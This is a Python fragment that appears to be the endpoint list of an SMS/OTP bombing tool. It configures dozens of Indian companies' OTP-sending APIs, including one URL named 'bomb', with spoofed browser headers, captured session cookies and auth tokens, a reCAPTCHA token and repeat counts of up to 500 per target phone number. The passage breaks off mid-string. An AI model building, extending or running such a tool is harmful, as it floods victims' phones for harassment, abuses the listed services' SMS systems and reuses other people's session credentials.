# ============ ORIGINAL API ============
    {
        "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO",
        "method": "GET",
        "headers": {},
        "data": None,
        "count": 100
    },
    # ============ NEW APIS ============
    {
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: json.dumps({"mobile_number": phone, "client_id": "kisan-app"}),
        "count": 10
    },
    
    {
        "url": "https://api.breeze.in/session/start",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-device-id": "A1pKVEDhlv66KLtoYsml3",
            "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
        },
        "data": lambda phone: json.dumps({
            "phoneNumber": phone,
            "authVerificationType": "otp",
            "device": {
                "id": "A1pKVEDhlv66KLtoYsml3",
                "platform": "Chrome",
                "type": "Desktop"
            },
            "countryCode": "+91"
        }),
        "count": 10
    },
    
    {
        "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=true",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "origin": "https://www.jockey.in",
            "referer": "https://www.jockey.in/",
            "cookie": "localization=IN; _shopify_y=6556c530-8773-4176-99cf-f587f9f00905; _tracking_consent=3.AMPS_INUP_f_f_4MXMfRPtTkGLORLJPTGqOQ; _ga=GA1.1.377231092.1757430108; _fbp=fb.1.1757430108545.190427387735094641; _quinn-sessionid=a2465823-ceb3-4519-9f8d-2a25035dfccd; cart=hWN2mTp3BwfmsVi0WqKuawTs?key=bae7dea0fc1b412ac5fceacb96232a06; wishlist_id=7531056362789hypmaaup; wishlist_customer_id=0; _shopify_s=d4985de8-eb08-47a0-9f41-84adb52e6298"
        },
        "data": None,
        "count": 10
    },
    
    {
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "gk-merchant-id": "19g6im8srkz9y",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyNDY4NywiZXhwIjoxNzU3NTI0NzQ3fQ.xkq3U9_Z0nTKhidL6rZ-N8PXMJOD2jo6II-v3oCtVYo"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country": "IN"}),
        "count": 10
    },

    {
        "url": "https://api.redcliffelabs.com/api/v1/notification/send_otp/?from=website&is_resend=false",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({
            "phone_number": phone,
            "short": True,
            "country_code": "+91",
            "medium": ""
        }),
        "count": 10
    },

    {
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "content-type": "application/json",
            "randomid": "42517571-2047-4b35-a6b9-c9b2687857f9",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "origin": "https://www.pw.live",
            "referer": "https://www.pw.live/"
        },
        "data": lambda phone: json.dumps({
            "mobile": phone,
            "organizationId": "5eb393ee95fab7468a79d189"
        }),
        "count": 10
    },
    
    {
        "url": "https://citymall.live/api/cl-user/auth/get-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://citymall.live",
            "Referer": "https://citymall.live/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone_number": phone}),
        "count": 12
    },

    # LICIOUS EXTREME
    {
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.licious.in",
            "Referer": "https://www.licious.in/",
            "Cookie": f"_ga=GA1.1.{random.randint(111111111,999999999)}.{random.randint(1111111111,1999999999)}; _fbp=fb.1.{random.randint(1111111111111,1999999999999)}",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None}),
        "count": 12
    },

    # BISLERI BULK
    {
        "url": "https://apis.bisleri.com/send-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://www.bisleri.com",
            "Referer": "https://www.bisleri.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"email": f"user{random.randint(1000,9999)}@gmail.com", "mobile": phone}),
        "count": 10
    },

    # OYO BULK
    {
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "https://www.oyorooms.com",
            "Referer": "https://www.oyorooms.com/",
            "Cookie": "user_id=none; country_code=IN; language=en;",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "nod": 4}),
        "count": 8
    },

    # BELLAVITA BULK
    {
        "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}",
        "method": "GET",
        "headers": {
            "Accept": "*/*",
            "Origin": "https://bellavitaorganic.com",
            "Referer": "https://bellavitaorganic.com/",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 8
    },

    # ============ COUNT=5 (3).txt APIs ============
    {
        "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.pw.live",
            "priority": "u=1, i",
            "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f",
            "referer": "https://www.pw.live/",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile": phone, "countryCode": "+91", "subOrgId": "SUB-PWLI000"}),
        "count": 5
    },
    
    {
        "url": "https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{phone}&countrycode=IN&country=india",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Length": "0",
            "Origin": "https://www.zoho.com",
            "Referer": "https://www.zoho.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": None,
        "count": 500
    },
    
    {
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
        "method": "POST",
        "headers": {
            "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587",
            "x-app-version": "3.0.3",
            "x-user-journey-id": "7e4e8701-18c6-4ed7-b7f5-eb0a2ba2fbec",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda phone: json.dumps({"phone_number": {"country_code": "+91", "number": phone}}),
        "count": 20
    },
    
    {
        "url": "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "shell#lang=en; ASP.NET_SessionId=nyoubocr2b4vz3iv2ahat3xs; ARRAffinity=433759ed76e330312e38a9f2e2e43b4a938d01a030cf5413c8faacb778ec580c; ARRAffinitySameSite=433759ed76e330312e38a9f2e2e43b4a938d01a030cf5413c8faacb778ec580c; _gcl_aw=GCL.1728839037.EAIaIQobChMIrY6l8umLiQMV5KhmAh1TaA0oEAMYASAAEgJ4pfD_BwE; _gcl_gs=2.1.k1$i1728839026$u150997757; _gcl_au=1.1.486755895.1728839037; _ga=GA1.1.694452391.1728839040; sts=eyJzaWQiOjE3Mjg4MzkwNDA3MjgsInR4IjoxNzI4ODM5MDQwNzI4LCJ1cmwiOiJodHRwcyUzQSUyRiUyRnVkeW9ncGx1cy5hZGl0eWFiaXJsYWNhcGl0YWwuY29tJTJGc2lnbnVwLWNvYnJhbmRlZCUzRnVybCUzRCUyRiUyNnV0bV9zb3VyY2UlM0REZW50c3Vnb29nbGUlMjZ1dG1fY2FtcGFpZ24lM0R0cmF2ZWxfcG1heCUyNnV0bV9tZWRpdW0lM0QlMjZ1dG1fY29udGVudCUzRGtscmFodWwlMjZqb3VybmV5JTNEcGwlMjZnYWRfc291cmNlJTNEMSUyNmdjbGlkJTNERUFJYUlRb2JDaE1Jclk2bDh1bUxpUU1WNUtobUFoMVRhQTBvRUFNWUFTQUFFZ0o0cGZEX0J3RSIsInBldCI6MTcyODgzOTA0MDcyOCwic2V0IjoxNzI4ODM5MDQwNzI4fQ==; stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiI5YTdmMGYyZC01NDJjLTRiNTEtYWEwNC01NzAwMjRlN2M4YjAifQ==; stgeo=IjAi; stbpnenable=MA==; __stdf=MA==; _ga_4CYZ07WNGN=GS1.1.1728839040.1.0.1728839049.51.0.0",
            "Origin": "https://udyogplus.adityabirlacapital.com",
            "Referer": "https://udyogplus.adityabirlacapital.com/signup-cobranded?url=/&utm_source=Dentsugoogle&utm_campaign=travel_pmax&utm_medium=&utm_content=klrahul&journey=pl&gad_source=1&gclid=EAIaIQobChMIrY6l8umLiQMV5KhmAh1TaA0oEAMYASAAEgJ4pfD_BwE",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"MobileNumber={phone}&functionality=signup",
        "count": 1
    },
    
    {
        "url": "https://www.muthootfinance.com/smsapi.php",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "AWSALBAPP-0=_remove_; AWSALBAPP-1=_remove_; AWSALBAPP-2=_remove_; AWSALBAPP-3=_remove_; _gcl_au=1.1.289346829.1728838221; _ga_S5CNT4BSQC=GS1.1.1728838222.1.0.1728838222.60.0.0; _ga=GA1.2.273797446.1728838222; _gid=GA1.2.1628453949.1728838223; _gat_UA-38238796-1=1; _fbp=fb.1.1728838224699.885355239931807707; toasterClosedOnce=true",
            "origin": "https://www.muthootfinance.com",
            "priority": "u=1, i",
            "referer": "https://www.muthootfinance.com/personal-loan",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"mobile={phone}&pin=XjtYYEdhP0haXjo3",
        "count": 3
    },
    
    {
        "url": "https://api.gopaysense.com/users/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "cookie": "_ga=GA1.2.1154421870.1728838134; _gid=GA1.2.883266871.1728838135; _gat_UA-96384581-2=1; WZRK_G=1acba64bbe41434abc9c3d3d5645deeb; WZRK_S_8RK-99W-485Z=%7B%22p%22%3A1%2C%22s%22%3A1728838134%2C%22t%22%3A1728838134%7D; _uetsid=0982d4e0898311ef9e26c943f5765261; _uetvid=09833b40898311efb6d4f32471c8cf05; _ga_4S93MBNNX8=GS1.2.1728838135.1.0.1728838140.55.0.0; _ga_F7R96SWGCB=GS1.1.1728838134.1.1.1728838140.0.0.0",
            "origin": "https://www.gopaysense.com",
            "priority": "u=1, i",
            "referer": "https://www.gopaysense.com/",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 5
    },
    
    {
        "url": "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1&_wrapper_format=drupal_ajax",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "gclid=undefined; AKA_A2=A",
            "origin": "https://www.iifl.com",
            "priority": "u=1, i",
            "referer": "https://www.iifl.com/personal-loans",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda phone: f"apply_for=18&full_name=Adnvs+Signh&mobile_number={phone}&terms_and_condition=1&utm_source=&utm_medium=&utm_campaign=&utm_content=&utm_term=&campaign=&gclid=&lead_id=&redirect_url=&form_build_id=form-FvvMqggkrdM-07pMIIyAElAcaj_kGjCMOS5UHKh_vUc&form_id=webform_submission_muti_step_lead_gen_form_node_66_add_form&_triggering_element_name=op&_triggering_element_value=Apply+Now&_drupal_ajax=1&ajax_page_state%5Btheme%5D=iifl_finance&ajax_page_state%5Btheme_token%5D=&ajax_page_state%5Blibraries%5D=bootstrap_barrio%2Fglobal-styling%2Cclientside_validation_jquery%2Fcv.jquery.ckeditor%2Cclientside_validation_jquery%2Fcv.jquery.ife%2Cclientside_validation_jquery%2Fcv.jquery.validate%2Cclientside_validation_jquery%2Fcv.pattern.method%2Ccore%2Fdrupal.autocomplete%2Ccore%2Fdrupal.collapse%2Ccore%2Fdrupal.states%2Ccore%2Finternal.jquery.form%2Ceu_cookie_compliance%2Feu_cookie_compliance_default%2Ciifl_crm_api%2Fglobal-styling%2Ciifl_crm_api%2Fgold-global-styling%2Ciifl_finance%2Fbootstrap%2Ciifl_finance%2Fbreadcrumb%2Ciifl_finance%2Fdailyhunt-pixel%2Ciifl_finance%2Fdatalayer%2Ciifl_finance%2Fglobal-styling%2Ciifl_finance%2Fpersonal-loan%2Ciifl_finance_common%2Fglobal%2Cnode_like_dislike_field%2Fnode_like_dislike_field%2Cparagraphs%2Fdrupal.paragraphs.unpublished%2Csearch_autocomplete%2Ftheme.minimal.css%2Csystem%2Fbase%2Cviews%2Fviews.module%2Cwebform%2Fwebform.ajax%2Cwebform%2Fwebform.composite%2Cwebform%2Fwebform.dialog%2Cwebform%2Fwebform.element.details%2Cwebform%2Fwebform.element.details.save%2Cwebform%2Fwebform.element.details.toggle%2Cwebform%2Fwebform.element.message%2Cwebform%2Fwebform.element.options%2Cwebform%2Fwebform.element.select%2Cwebform%2Fwebform.form",
        "count": 5
    },
    
    {
        "url": "https://v2-api.bankopen.co/users/register/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "baggage": "sentry-environment=prod,sentry-release=app-open-money%405.2.0,sentry-public_key=76093829eb3048de9926891ff8e44fac,sentry-trace_id=a17bb4c75de741ffa0998329abf41310",
            "content-type": "application/json",
            "origin": "https://app.opencapital.co.in",
            "priority": "u=1, i",
            "referer": "https://app.opencapital.co.in/en/onboarding/register?utm_source=google&utm_medium=cpc&utm_campaign=IYD_MaxTesting&utm_term=&utm_placement=&gad_source=1&gclid=EAIaIQobChMIo_vwi96LiQMVQaVmAh27cAhXEAAYAiAAEgIkAPD_BwE",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sentry-trace": "a17bb4c75de741ffa0998329abf41310-bc065941fd22d33d-1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-api-version": "3.1",
            "x-client-type": "Web"
        },
        "data": lambda phone: json.dumps({"username": phone, "is_open_capital": 1}),
        "count": 5
    },
    
    {
        "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.tatacapital.com",
            "priority": "u=0, i",
            "referer": "https://www.tatacapital.com/",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({
            "header": {
                "authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==",
                "identifier": "nli"
            },
            "body": {
                "mobileNumber": phone
            }
        }),
        "count": 40
    },
    
    {
        "url": "https://apis.tradeindia.com/app_login_api/login_app",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "client_remote_address": "10.0.2.16",
            "content-type": "application/json",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/4.11.0"
        },
        "data": lambda phone: json.dumps({"mobile": f"+91{phone}"}),
        "count": 3
    },
    
    {
        "url": "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {
            "x-kb-app-name": "khatabook",
            "x-kb-app-version": "801800",
            "x-kb-app-locale": "en",
            "x-kb-platform": "android",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.10.0"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "app_signature": "wk+avHrHZf2"}),
        "count": 20
    },
    
    {
        "url": "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.orangehealth.in",
            "priority": "u=1, i",
            "referer": "https://www.orangehealth.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_number": phone, "customer_auto_fetch_message": True}),
        "count": 3
    },
    
    {
        "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1",
            "language": "en",
            "origin": "https://www.jobhai.com",
            "priority": "u=1, i",
            "referer": "https://www.jobhai.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "source": "WEB",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-transaction-id": "JS-WEB-89b40679-56c2-4c0e-926e-0fafca8a84f3"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 5
    },
    
    {
        "url": "https://mconnect.isteer.co/mconnect/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "app_platform": "mvaahna",
            "content-type": "application/json",
            "origin": "https://mvaahna.com",
            "priority": "u=1, i",
            "referer": "https://mvaahna.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"mobile_number": f"+91{phone}"}),
        "count": 50
    },
    
    {
        "url": "https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={phone}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank&_=1719472121119",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cookie": "_gid=GA1.2.1239008246.1719472125; _gat_gtag_UA_245702_1=1; _ga=GA1.1.1226959669.1719472122; _ga_1C0W65RV19=GS1.1.1719472121.1.1.1719472138.0.0.0; _ga_0VL2HF4X5B=GS1.1.1719472125.1.1.1719472138.47.0.0",
            "referer": "https://www.astrosage.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "script",
            "sec-fetch-mode": "no-cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 3
    },
    
    {
        "url": "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "varnishPrefixHome=false; utm_source=SPD-Search-Top8-National-Brand-EM-Home; utm_medium=gads_c_search; platform=web; _gcl_gs=2.1.k1$i1719310791; _gcl_au=1.1.1890033919.1719310798; _gcl_aw=GCL.1719310800.EAIaIQobChMI5dC558P2hgMVUhaDAx2-3AwcEAAYASAAEgJXUvD_BwE; _ga=GA1.1.1822449614.1719310800; _fbp=fb.1.1719310801079.320900520174536436; _ga_WQREN8TJ7R=GS1.1.1719310799.1.1.1719310837.22.0.0",
            "origin": "https://www.spinny.com",
            "platform": "web",
            "priority": "u=1, i",
            "referer": "https://www.spinny.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "g-recaptcha-response": "03AFcWeA4vFfvSahNObwINE1dnN-C8rahsbSbuh4fqeqcBJ82qWMuwus56lEKOYaUxj8u0opIAA7co7oDhBaTuIHM-Do3wgKmbo68rCKnvtFpPHiKiEpmKQhPcjvAT_6_y-2iyj_DR80S5npM-jXnNMoFS92SJQYvjGBbWFD9lFiFEgbnAWMBxUwNVyacx1gVszD7HvqC_nLDISnnqi7iWBjoYDJgTUg5iqds1DA-KYxbtEDtcpKgBi6Em34U4GG1ggZoKijC-k8qy1lInhWqo-xK6EY6acXydcGHKgXzWrsdHG2aciibuozN-3ZAWNfN0GsFfU4L1os4pe4ruCW1rEAuDJ3HT5ojiD5iiUUg4OBcJkUHCu2LSTBrTacO8PHH4PT5ruV-rvZyNVvAuX5xDcJea1NBUYyMitVtK0Lf1M75e3k3XL6K1MTq3QDDPXJlrStTSrB6qZ-m3n9Tf6sCnDZ0jcRoMtHU414MzHym3Itswbj5YuJM8wcn5aAnvvBv7UGskct4Jz4ZyJdcC5cS8AzYNSmyAS3JawN644RVl59KaNGsuYt9Ls7o2UtWhkIwlIsIBukVZW35yTaGNUhEWaRrDD-3BfUwKtloJItM2En2_nuI3f71HfTVI-I0dY6kTrMRuYfCGaz67jZiekSSIuOxenxVxp1BcG6rEO-zx-fRM_gMyDuiKGTmq98l-lPIfhSUFRXtloNr_qcKp1m6_jpzrfIi8M6UhiCYcnQCmNv19MAA8BWnEiyPPI_-FGh12jp22OCGA0mcoqGNadE6w-IezHN8fi6aWBAPRgEYf42XPv5oWiVa0ykvHg0MZKChb7n3Avk_ADibr632go3SVIIfXrFUgbWsUDLocd1WBkpeaUyKlKSqisbjKqHpxFMMaJGcjapUDstT1EMFINhNUCgowcKTY5zGMm9W9R9N48Ouxgyin2c7_0LmS5wPj3onP9yOJ8E6GL3aMKhtcxn4lXfxymyB1VFMzMMD-sAfkVoMliWhsludZWTOhuSXUE75SYxfDjrOQTlu6oRrda8QbMpR7Hv2qK2NjnrlNx4Qq2wSR0w56-Qtlif5gfFrD0U_TI7OH-yVcj45v_p0jGdoJ2Zh_6oFip5fSnSgdzXhSoGAKEVbm6NGrIGYiWLj6o-fnZrzpfRvqaS9NedG3qjr0p94lVFSeiW0s0BK0KpDWlwY4C7nbeqLkjk55tabY9B_nZjN7IXmJKNv46tZqMJVZJW37z7xV9aBQ17VARz8_UgluqS97i-NwsLuwWMZpCNpJeYGRVIKFSJtN1l3LutO1USLkYU9Or9fPEPPSOpG0fDbaFnK2QVruku8XnhvEYGHHEM0mFGcJK1-Eds95wA1c3P0Hr6DLfW7k3JKjQx_hJm719-w-UwsOYqZccz1Sh00-dmGlSJsrgOljgPOD8ZVca4Xso92P-W3NxnNEZLO45IjzTIkB1ItKYEDG7V1b4ixqw36J_lkPt7ekLvFMhcvNZkyIWTpI42Ag7ALnn6P3SfWAZwkrGXry6LPikOJz1zB5FdzEtUuF9_EO-YjzBRr1pv9ZmbSbdT2MOJv3rQ40GREvbIIfd_BA_zSyPl7HSe8QMlBksjHapVfBE_jNtcakDVSWdE6CBZjPksgIUIv6yzC0LWZA1h6v4mX-K85